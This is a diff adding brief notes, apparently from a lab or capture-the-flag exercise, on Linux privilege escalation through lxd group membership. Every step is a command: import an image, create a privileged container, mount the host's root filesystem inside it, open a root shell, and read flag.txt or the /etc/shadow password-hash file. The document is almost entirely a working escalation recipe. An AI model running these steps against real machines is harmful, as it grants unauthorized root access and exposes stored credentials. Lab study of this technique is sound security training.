@@ -1,0 +1,17 @@
+- Look at what groups you are a part of, lxd or docker
+- Steps to take for privesc
+	- cd ContainerImages
+	- lxc import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias <whatevername>
+		- lxc image list
+		- lxc init <whatevername> privesc -c security.privileged=true
+		- lxc config device add privesc host-root disk source=/  path=/mnt/root recursive=true
+		- lxc start privesc
+		- lxc exec privesc /bin/bash OR /bin/sh
+		- From here, run ID when you get the # prompt
+		- Run the following command to start:
+			- ls -l /mnt/root. This is because you have mounted on to the actual system, mnt/root is your starting point.
+		- To view contents, you can run:
+			- cd /mnt/root/root/ and cat /mnt/root/root/flag.txt
+			OR
+			- From /mnt/root
+			- cat /mnt/root/etc/shadow
